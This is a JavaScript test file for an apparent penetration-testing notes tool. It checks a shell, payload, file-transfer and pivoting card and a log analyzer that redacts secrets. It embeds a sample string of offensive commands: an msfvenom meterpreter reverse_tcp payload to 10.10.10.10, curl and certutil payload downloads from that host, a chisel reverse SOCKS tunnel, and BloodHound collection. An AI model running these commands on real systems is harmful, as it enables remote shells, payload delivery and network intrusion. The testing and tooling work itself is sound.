'use strict';
const assert=require('assert');
const cp=require('child_process');
const path=require('path');
const root=path.join(__dirname,'..');
function load(rel){require(path.join(root,rel));}
function run(args){const result=cp.spawnSync(process.execPath,args.map((part,index)=>index===0?path.join(root,part):part),{cwd:root,encoding:'utf8'});process.stdout.write(result.stdout||'');process.stderr.write(result.stderr||'');if(result.status!==0)process.exit(result.status||1);}
function versionAtLeast(actual,minimum){const a=String(actual||'').replace(/^v/i,'').split('.').map(Number),b=String(minimum||'').replace(/^v/i,'').split('.').map(Number);for(let i=0;i<3;i++){const d=(a[i]||0)-(b[i]||0);if(d)return d>0;}return true;}

globalThis.__OBOL_DEFER_PRODUCT_HARDENING_EXTENSIONS__=true;
globalThis.setTimeout=undefined;
globalThis.addEventListener=undefined;
load('data/current-release.js');
assert.ok(versionAtLeast(globalThis.OBOL_CURRENT_RELEASE.label,'v9.86'),'current release should be v9.86 or newer');
assert.ok(globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions.includes('data/product-hardening/shells-payloads-file-transfer-cluster-v9.86.js'));

load('data/product-hardening/product-hardening-queue.js');
load('data/product-hardening/work-packages.js');
load('data/note-integration.js');
load('data/note-integration-reviews.js');
load('data/note-integration-packets.js');
load('data/product-hardening/note-mechanic-backfill-v9.38.js');
load('data/product-hardening/note-progress-current.js');
load('data/runtime-manifest.js');
for(const src of globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions)load(src);
load('data/product-hardening/build-next-queue-hygiene-current.js');

const wave=globalThis.OBOL_SHELL_PAYLOAD_TRANSFER_CLUSTER_V986;
assert.ok(wave,'v9.86 shell/payload/transfer cluster should expose status');
assert.strictEqual(wave.status,'live-integrated');
assert.strictEqual(wave.activeQueueId,'source-note-cluster-shells-payloads-and-file-transfer-stabilization');
assert.strictEqual(wave.clusterId,'shells-payloads-and-file-transfer-stabilization');
assert.strictEqual(wave.nextQueueId,'source-note-cluster-linux-privesc-enumeration-and-proof');
assert.deepStrictEqual(wave.primaryCardIds,['listener-and-shell-stabilization-card']);
assert.ok(wave.enrichedCardIds.includes('metasploit-resource-pivot-workflow'));
assert.ok(wave.enrichedCardIds.includes('web-upload-inclusion-proof-chain'));
assert.ok(wave.enrichedCardIds.includes('ad-enumeration-bloodhound-collection'));
assert.strictEqual(wave.reviewTextChars,445028);
assert.strictEqual(wave.noteCount,24);
assert.deepStrictEqual(wave.failures,[]);
assert.ok(wave.notesIntegrated&&wave.shellIntegrated&&wave.ownersIntegrated&&wave.analyzerIntegrated&&wave.clusterCompleted&&wave.queuePatched);

const card=globalThis.CARDS&&globalThis.CARDS['listener-and-shell-stabilization-card'];
assert.ok(card,'listener and shell stabilization card should exist as a real primary card');
assert.strictEqual(card.cardKind,'primary');
assert.strictEqual(card.cardOrigin,'product-hardening');
assert.strictEqual(card.introducedIn,'v9.86');
assert.strictEqual(card.currentOwner,true);
assert.ok(!card.foldedFrom || !card.foldedFrom.includes('listener-and-shell-stabilization-card'));
assert.ok(/listener|callback|payload|transfer|shell|tunnel|cleanup/i.test(card.operatorGoal+card.hypothesis));
for(const row of card.commands||[])assert.ok(row.tool&&row.run&&row.when&&row.evidence&&row.note,'new shell card command needs full action-spine fields');
const runs=(card.commands||[]).map(row=>String(row.run||''));
for(const expected of [/nc -lvnp/i,/rlwrap/i,/msfvenom/i,/multi\/handler/i,/pty\.spawn/i,/stty raw/i,/python3 -m http\.server/i,/curl .*wget|wget .*curl/i,/iwr/i,/certutil/i,/smbserver\.py/i,/chisel/i,/ptunnel-ng/i,/dnscat2/i,/python2 server\.py/i,/proxychains/i])assert.ok(runs.some(run=>expected.test(run)),'missing shell workflow command pattern '+expected);
assert.ok((card.tools||[]).includes('rpivot'),'shell card should retain rpivot as the tool label for the python2 server.py workflow');
for(const fact of ['shell.listener_ready_reviewed','shell.callback_received_reviewed','shell.payload_handler_match_reviewed','shell.file_transfer_reviewed','shell.pty_stabilization_reviewed','pivot.tunnel_route_reviewed','pivot.proxychains_probe_reviewed','cleanup.payload_shell_artifacts_reviewed','report.shell_boundary_reviewed'])assert.ok((card.produces||[]).includes(fact),'shell card missing produced fact '+fact);
const text=JSON.stringify(card);
assert.ok(!/source-mining|source re-mining|release cleanup|patch panel|\bUNKNOWN\b|unknown|methodology gap|stabilizer/i.test(text),'new shell card must not leak implementation slop');
assert.ok(!globalThis.CARDS['reverse-shell-wrapper-card'],'must not create shell wrapper card');
assert.ok(!globalThis.CARDS['payload-transfer-wrapper-card'],'must not create payload transfer wrapper card');
assert.ok(!globalThis.CARDS['tunnel-proof-wrapper-card'],'must not create tunnel wrapper card');

const notes=globalThis.OBOL_NOTE_INTEGRATION.publicFieldNotes||[];
const noteIds=new Set(notes.map(note=>note&&note.id).filter(Boolean));
for(const id of wave.publicNoteIds)assert.ok(noteIds.has(id),'missing v9.86 public field note '+id);
for(const note of notes.filter(note=>note&&wave.publicNoteIds.includes(note.id))){
 assert.ok((note.cardIds||[]).every(id=>wave.enrichedCardIds.includes(id)),'v9.86 note binds to a known owner card');
 assert.ok((note.pathIds||[]).every(id=>wave.enrichedCardIds.includes(id)),'v9.86 path note binds to a known owner card');
}

const pivot=globalThis.CARDS&&globalThis.CARDS['metasploit-resource-pivot-workflow'];
assert.ok(pivot&&JSON.stringify(pivot).includes('Tunnel setup and internal service reachability separated'),'pivot owner should be enriched');
const upload=globalThis.CARDS&&globalThis.CARDS['web-upload-inclusion-proof-chain'];
assert.ok(upload&&JSON.stringify(upload).includes('File transfer source destination and cleanup captured'),'upload owner should be enriched');
const ad=globalThis.CARDS&&globalThis.CARDS['ad-enumeration-bloodhound-collection'];
assert.ok(ad&&JSON.stringify(ad).includes('SharpHound'),'AD owner should capture collection output transfer handling');

const sample='nc -lvnp 4444 listening on 0.0.0.0 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe use exploit/multi/handler command shell session 1 opened whoami python3 -c "import pty; pty.spawn(\'/bin/bash\')" stty raw -echo python3 -m http.server 8000 curl -fsSLo payload http://10.10.10.10:8000/payload certutil.exe -urlcache -split -f http://10.10.10.10:8000/payload payload.exe chisel server -p 9001 --reverse chisel client 10.10.10.10:9001 R:socks proxychains -q nmap -sT -Pn -n -p 3389 172.16.1.10 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp delete cleanup complete HTB{secret} OS{secret} Answer: flag password=BadThing';
const analysis=globalThis.OBOL_SHELL_PAYLOAD_TRANSFER_ANALYZER_V986.analyze(sample);
for(const fact of ['shell.listener_observed','shell.callback_or_session_observed','shell.payload_handler_observed','shell.stabilization_observed','shell.file_transfer_observed','pivot.tunnel_route_observed','pivot.internal_probe_observed','ad.collection_artifact_observed','cleanup.artifact_cleanup_observed'])assert.ok(analysis.outcomeFacts.includes(fact),'missing analyzer fact '+fact);
assert.ok(!/HTB\{|OS\{|Answer: flag|password=BadThing|10\.10\.10\.10/i.test(JSON.stringify(analysis)),'analysis output should be public-safe redacted');
const intake=globalThis.OBOL_INTAKE_V21&&globalThis.OBOL_INTAKE_V21.analyzeTerminal(sample);
assert.ok(intake&&Array.isArray(intake.activities)&&intake.activities.some(row=>row.cardId==='listener-and-shell-stabilization-card'),'intake should add shell/payload transfer activity');

const clusters=globalThis.OBOL_SOURCE_NOTE_CLUSTERS;
assert.ok(clusters&&clusters.status,'source cluster ledger should remain exposed');
assert.strictEqual(clusters.status.latestCompletedClusterQueue,'source-note-cluster-shells-payloads-and-file-transfer-stabilization');
assert.strictEqual(clusters.status.latestCompletedClusterId,'shells-payloads-and-file-transfer-stabilization');
assert.strictEqual(clusters.status.latestCompletedClusterReviewTextChars,445028);
assert.deepStrictEqual(clusters.status.latestCompletedClusterOwnerCards,['listener-and-shell-stabilization-card','metasploit-resource-pivot-workflow','web-upload-inclusion-proof-chain','ad-enumeration-bloodhound-collection']);
assert.strictEqual(clusters.status.reviewedSourceNotes,386);
assert.strictEqual(clusters.status.pendingSourceNotes,170);
assert.strictEqual(clusters.status.clusteredPendingNotes,170);
assert.strictEqual(clusters.status.unclusteredPendingNotes,0);
assert.strictEqual(clusters.status.clusterCount,9);
assert.strictEqual(clusters.pendingClusters.length,9);
assert.strictEqual(clusters.reviewQueue.length,9);
assert.strictEqual(clusters.pendingClusters.reduce((sum,entry)=>sum+(entry.pendingCount||0),0),170);
assert.ok(!clusters.pendingClusters.some(entry=>entry.id==='shells-payloads-and-file-transfer-stabilization'));
assert.ok(!clusters.reviewQueue.some(entry=>entry.id==='source-note-cluster-shells-payloads-and-file-transfer-stabilization'));
assert.ok(clusters.reviewQueue[0]&&clusters.reviewQueue[0].id==='source-note-cluster-linux-privesc-enumeration-and-proof','next queue should advance to Linux privesc');
assert.deepStrictEqual(clusters.validate(),[]);

const q=globalThis.OBOL_PRODUCT_HARDENING;
assert.ok(q.nextNotesBatch,'dashboard/queue hygiene should expose the next reconciled cluster after v9.86');
assert.strictEqual(q.nextNotesBatch.queueMode,'cluster-review');
assert.strictEqual(q.nextNotesBatch.id,'source-note-cluster-linux-privesc-enumeration-and-proof');
assert.strictEqual(q.nextNotesBatch.clusterId,'linux-privesc-enumeration-and-proof');
assert.ok(/linux|privilege|sudo|suid|kernel/i.test(q.nextNotesBatch.label),'dashboard next notes batch should advance to Linux privesc');

run(['tools/validate-source-note-clusters.js']);
run(['tools/validate-product-hardening-card-routes.js']);
run(['tools/validate-note-card-path-placement.js']);
run(['tools/validate-actionable-next-step-cards.js']);
run(['tools/validate-action-first-card-cleanup.js']);
run(['tools/validate-path-card-uniqueness-v9.72.js']);
run(['tools/validate-release-pr.js','--repo-only','--release-version=9.86']);
console.log('v9.86 mined shell, payload, transfer, tunnel route, AD artifact handling, and dashboard queue handoff.');
